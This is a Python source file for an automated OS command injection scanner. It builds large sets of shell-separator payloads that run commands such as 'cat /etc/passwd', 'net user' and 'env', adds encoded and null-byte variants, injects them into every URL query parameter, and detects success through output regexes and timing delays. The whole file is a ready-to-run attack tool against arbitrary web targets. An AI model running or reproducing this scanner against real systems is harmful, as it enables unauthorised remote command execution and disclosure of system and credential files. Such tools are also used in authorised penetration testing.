import asyncio
import logging
import re
import time
import urllib.parse
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import httpx

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


def get_success_patterns() -> List[str]:
    return [
        r'uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\)',
        r'root:.*?:/root:/bin/bash',
        r'Linux\s+.*?\s+\d+\.\d+\.\d+',
        r'total\s+\d+',
        r'drwxr-xr-x',
        r'-rw-r--r--',
        r'bin\s+boot\s+dev\s+etc',
        r'proc\s+sys\s+usr\s+var',
        r'/bin/sh\s+/bin/bash',
        r'kernel\s+version',
        r'Volume\s+in\s+drive\s+[A-Z]',
        r'Directory\s+of\s+[A-Z]:\\',
        r'<DIR>',
        r'Microsoft\s+Windows',
        r'Windows\s+NT\s+\d+\.\d+',
        r'WINDOWS\\system32',
        r'C:\\>',
        r'System32',
        r'Program\s+Files',
        r'HKEY_LOCAL_MACHINE',
        r'command\s+not\s+found',
        r'sh:\s+.*?:\s+not\s+found',
        r'cannot\s+access\s+.*?:\s+No\s+such\s+file',
        r'permission\s+denied',
        r'PATH=.*?:/usr/bin:/bin',
        r'HOME=.*?USER=',
        r'PING\s+.*?\s+\(',
        r'ping:\s+.*?:\s+Name\s+or\s+service\s+not\s+known',
        r'nslookup\s+.*?',
        r'sleep\s+\d+',
        r'timeout\s+\d+',
        r'&&\s+echo\s+.*?\s+&&',
        r';\s*echo\s+.*?;',
    ]


def generate_payloads() -> List[str]:
    separators = [';', '&', '&&', '|', '||', '`', '$()']
    test_commands = [
        'whoami', 'id', 'pwd', 'uname -a', 'cat /etc/passwd',
        'ls -la', 'ps aux', 'env', 'echo $PATH', 'which python',
        'sleep 5', 'ping -c 1 127.0.0.1', 'nslookup google.com',
        'dir', 'ipconfig', 'systeminfo', 'type C:\\Windows\\win.ini',
        'echo %PATH%', 'ping -n 1 127.0.0.1', 'timeout 5', 'net user',
        'python --version', 'python3 --version', 'java -version',
        'node --version', 'curl --version', 'wget --version'
    ]
    payloads = set()

    for sep in separators:
        for cmd in test_commands:
            payloads.update([
                f'{sep} {cmd}', f'{sep}{cmd}', f' {sep} {cmd}',
                f'{sep} {cmd} {sep}', f'test{sep}{cmd}', f'1{sep}{cmd}',
                f'"{sep}{cmd}"', f"'{sep}{cmd}'"
            ])

    for cmd in ['whoami', 'id', 'pwd', 'echo test']:
        payloads.update([
            f'`{cmd}`', f'$({cmd})', f'test`{cmd}`test', f'test$({cmd})test'
        ])

    encoded_payloads = set()
    for payload in list(payloads)[:50]:
        encoded_payloads.update([
            urllib.parse.quote(payload),
            urllib.parse.quote(urllib.parse.quote(payload)),
            payload.replace(' ', '%20'),
            payload.replace(';', '%3B'),
            payload.replace('&', '%26'),
            payload.replace('|', '%7C')
        ])
    payloads.update(encoded_payloads)

    null_byte_payloads = set()
    for payload in list(payloads)[:30]:
        null_byte_payloads.update([
            f'{payload}%00', f'{payload}\x00', f'{payload}\\0'
        ])
    payloads.update(null_byte_payloads)

    return list(payloads)


def create_client(timeout: int = 10) -> httpx.AsyncClient:
    headers = {
        'User-Agent': 'Mozilla/5.0 (Security-Scanner) CommandInjection-Tester/2.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache'
    }
    return httpx.AsyncClient(
        headers=headers,
        timeout=httpx.Timeout(timeout, connect=5.0),
        limits=httpx.Limits(max_keepalive_connections=20, max_connections=100),
        follow_redirects=True,
        verify=True
    )


def check_vulnerability(response: httpx.Response, patterns: List[str], payload: str) -> Optional[Dict]:
    if response.status_code not in [200, 500]:
        return None
    content = response.text
    error_indicators = [
        'syntax error', 'command not found', 'invalid syntax',
        'unexpected token', 'parse error', 'illegal character',
        'permission denied', 'access denied', 'file not found',
        'no such file or directory'
    ]
    has_errors = any(error in content.lower() for error in error_indicators)
    matched_patterns = [p for p in patterns if re.search(p, content, re.IGNORECASE | re.MULTILINE)]

    if matched_patterns:
        return {
            'matched_patterns': matched_patterns,
            'has_errors': has_errors,
            'response_excerpt': content[:500] + '...' if len(content) > 500 else content
        }
    return None


def check_time_based_injection(response_time: float, baseline_time: float, payload: str) -> bool:
    time_payload_keywords = ['sleep', 'timeout', 'ping -n', 'ping -c']
    if any(keyword in payload.lower() for keyword in time_payload_keywords):
        return response_time > baseline_time + 3.0
    return False


def build_payload_urls(base_url: str) -> List[Tuple[str, str]]:
    parsed = urlparse(base_url)
    original_params = parse_qs(parsed.query, keep_blank_values=True)
    if not original_params:
        logger.warning(f"No parameters found in URL: {base_url}")
        return []

    base_path = urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', '', ''))
    payloads = generate_payloads()
    payload_urls = []

    for param in original_params:
        original_value = original_params[param][0] if original_params[param] else ''
        for payload in payloads:
            injection_positions = [
                payload, f'{original_value}{payload}', f'{payload}{original_value}',
                f'{original_value} {payload}', f'{payload} {original_value}'
            ]
            for injected_value in injection_positions:
                modified_params = original_params.copy()
                modified_params[param] = [injected_value]
                full_url = f"{base_path}?{urlencode(modified_params, doseq=True)}"
                payload_urls.append((full_url, payload))
    return payload_urls


async def test_single_url(target_url: str, timeout: int, delay: float, max_concurrent: int, patterns: List[str], baseline_time: float) -> Optional[Dict]:
    payload_urls = build_payload_urls(target_url)
    semaphore = asyncio.Semaphore(max_concurrent)

    async def test(url: str, payload: str) -> Optional[Dict]:
        async with semaphore:
            async with create_client(timeout) as client:
                start_time = time.time()
                try:
                    response = await client.get(url)
                    response_time = time.time() - start_time
                    vuln_check = check_vulnerability(response, patterns, payload)
                    time_based = check_time_based_injection(response_time, baseline_time, payload)

                    if vuln_check or time_based:
                        logger.warning(f"Command injection vulnerability found ({'Time-based' if time_based else 'Pattern-based'}): {url}")
                        return {
                            'url': url,
                            'payload': payload,
                            'vuln_type': 'time-based' if time_based else 'pattern-based',
                            'matched_patterns': vuln_check['matched_patterns'] if vuln_check else [],
                            'response_excerpt': vuln_check['response_excerpt'] if vuln_check else ''
                        }
                except Exception as e:
                    logger.error(f"Request failed for {url}: {e}")
                if delay:
                    await asyncio.sleep(delay)
        return None

    for full_url, payload in payload_urls:
        result = await test(full_url, payload)
        if result:
            return result
    return None


async def get_baseline_response_time(client: httpx.AsyncClient, url: str) -> float:
    try:
        start_time = time.time()
        await client.get(url)
        return time.time() - start_time
    except Exception:
        return 1.0


async def run_os_command_injection(target_urls: List[str], timeout: int = 15, delay: float = 0.2, max_concurrent: int = 8) -> Dict:
    logger.info(f"Starting OS command injection scan on {len(target_urls)} URLs")
    patterns = get_success_patterns()
    findings = []

    async with create_client(timeout) as client:
        baseline_time = await get_baseline_response_time(client, target_urls[0] + '?test=baseline')

    for url in target_urls:
        logger.info(f"Scanning {url}")
        result = await test_single_url(url, timeout, delay, max_concurrent, patterns, baseline_time)
        if result:
            findings.append(result)

    logger.info(f"Scan completed. Found {len(findings)} potential vulnerabilities")
    return {
        'findings': findings,
        'total_tested': len(target_urls),
        'vulnerabilities_found': len(findings)
    }
